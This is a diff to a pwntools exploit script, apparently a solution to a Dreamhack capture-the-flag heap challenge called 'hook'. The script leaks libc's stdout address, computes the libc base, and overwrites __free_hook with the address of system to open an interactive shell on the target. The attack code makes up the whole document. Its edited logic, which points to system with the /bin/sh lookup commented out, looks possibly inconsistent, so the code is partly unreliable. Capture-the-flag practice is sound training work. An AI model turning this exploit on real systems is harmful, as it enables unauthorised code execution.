@@ -1,22 +1,22 @@
 from pwn import *
 
-#p = process('./hook')
-#p = remote('host3.dreamhack.games', '16776')
-p = remote('127.0.0.1', '7182')
-libc = ELF('./libc-2.23.so')
+p = remote('127.0.0.1', 7182)
+e = ELF('./hook', checksec=False)
+libc = ELF('./libc-2.23.so', checksec=False)
 
 p.recvuntil(b"stdout: ")
-stdout = int(p.recvline()[:-1], 16)
-print(hex(stdout))
+stdout = int(p.recv(14), 16)
 
-binsh = 0x400a11
-print(libc.symbols['_IO_2_1_stdout_'])
-libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
-free_hook = libc_base + libc.symbols['__free_hook']
 
-payload = p64(free_hook) + p64(binsh)
+libc_base = stdout - libc.sym['_IO_2_1_stdout_']
+shell = libc_base + libc.sym['system'] #list(libc.search(b'/bin/sh'))[0]
+free_hook = libc_base + libc.sym['__free_hook']
 
-p.sendlineafter(b"Size: ", b"400")
-p.sendlineafter(b"Data: ", payload)
+print("stdout ->", hex(stdout))
+print("shell ->", hex(shell))
+
+buf = p64(free_hook) + p64(shell)
+p.sendlineafter(b"Size: ", str(len(buf)).encode())
+p.sendlineafter(b"Data: ", buf)
 
 p.interactive()
